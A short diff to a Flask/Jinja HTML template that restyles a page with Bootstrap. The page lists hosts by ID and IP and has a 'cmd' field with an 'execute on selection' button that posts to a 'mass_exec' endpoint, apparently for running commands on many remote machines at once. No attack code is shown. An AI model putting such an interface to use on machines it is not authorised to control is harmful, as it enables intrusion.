@@ -1,11 +1,11 @@
+{% extends 'bootstrap/base.html' %}
 
 
+{% block content %}
 <div class="container">
 	<form method="post" action="{{ url_for('api.mass_exec') }}">
-		<input type="text" name="cmd" id="cmd"/>
-		<input type="submit" name="exec" value="execute on selection" />
-	
-		<table>
+		
+		<table class="table">
 			<tr>
 				<th>ID</th>
 				<th>IP</th>
@@ -24,6 +24,10 @@
 			</tr>
 			{% endfor %}
 		</table>
+		<input type="text" name="cmd" id="cmd" class="form-control"/>
+		<input type="submit" name="exec" value="execute on selection" class="btn btn-danger" />
+	
 	</form>	
 
 </div>
+{% endblock %}
